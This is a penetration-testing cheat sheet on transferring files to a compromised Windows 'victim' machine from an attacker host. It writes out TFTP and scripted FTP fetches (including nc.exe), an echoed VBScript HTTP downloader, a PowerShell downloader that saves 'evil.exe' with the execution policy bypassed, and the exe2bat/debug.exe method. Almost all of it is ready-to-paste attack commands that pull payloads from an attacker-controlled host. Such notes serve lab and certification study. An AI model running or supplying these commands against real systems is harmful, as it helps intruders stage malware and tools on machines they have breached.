# File Transfer Windows

<b>TFTP</b> (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.)

	On attacker machine:
	
	mkdir tftp
	
	atftpd --deamon --port 69 tftp
	
	cp <[FILE]> tftp
	
	On victim machine shell:
	
	tftp -i <[IP]> GET <[FILE]>
	
<b>FTP</b> (Windows operating systems contain a default FTP client that can also be used for file transfer)

On attacker machine:

	(UNA TANTUM) Install a ftp server. apt-get install pure-ftpd
	
	(UNA TANTUM) Create new user for PureFTPD (see script setup-ftp.sh) (USER demo, PASS demo1234)
	
		groupadd ftgroup

		useradd -g ftpgroup -d /dev/null -s /etc ftpuser

		pure-pw useradd demo -u ftpuser -d /ftphome

		pure-pw mkdb

		cd /etc/pure-ftpd/auth

		ln -s ../conf/PureDB 60pdb

		mkdir -p /ftphome

		chown -R ftpuser:ftpgroup /ftphome
	
		/etc/init.d/pure-ftpd restart
	
	(UNA TANTUM) chmod 755 setup-ftp.sh
	
On victim machine shell:

	echo open <[IP]> 21 > ftp.txt
	
	echo USER demo >> ftp.txt
	
	echo ftp >> ftp.txt
	
	echo bin >> ftp.txt
	
	echo GET nc.exe >> ftp.txt
	
	echo bye >> ftp.txt
	
	ftp -v -n -s:ftp.txt
	
<b>VBScript (in Windows XP, 2003)</b>

On victim machine shell:

	echo strUrl = WScript.Arguments.Item(0) > wget.vbs &
	
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs &
	
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs &
	
	echo Err.Clear >> wget.vbs &
	
	echo Set http = Nothing >> wget.vbs &
	
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs &
	
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs &
	
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs &
	
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs &
	
	echo http.Open "GET", strURL, False >> wget.vbs &
	
	echo http.Send >> wget.vbs &
	
	echo varByteArray = http.ResponseBody >> wget.vbs &
	
	echo Set http = Nothing >> wget.vbs &
	
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs &
	
	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs &
	
	echo strData = "" >> wget.vbs &
	
	echo strBuffer = "" >> wget.vbs &
	
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs &
	
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter +1, 1))) >> wget.vbs &
	
	echo Next >> wget.vbs &
	
	echo ts.Close >> wget.vbs

	cscript wget.vbs http://<[IP]>/<[FILE]> <[FILE_NAME]>
	
<b>Powershell</b> (In Windows 7, 2008 and above)

On victim machine shell:

	echo $storageDir = $pwd > wget.ps1
	
	echo $webclient = New-Object System.Net.WebClient >> wget.ps1
	
	echo $url = "http://<[IP]>/<[FILE]>" >> wget.ps1
	
	echo $file = "evil.exe" >> wget.ps1
	
	echo $webclient.DownloadFile($url,$file) >> wget.ps1
	
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	
<b>Debug.exe utility</b> (In Windows 32bit OS - Works only for file < 64Kb)

On attacker machine:

	cp <[FILE]> .

	upx -9 <[FILE]> (for compression)
	
	cp /usr/share/windows-binaries/exe2bat.exe .
	
	wine exe2bat <[FILE]> <[FILE.txt]>

On victim machine:

	Paste the content of <[FILE.txt]>
	
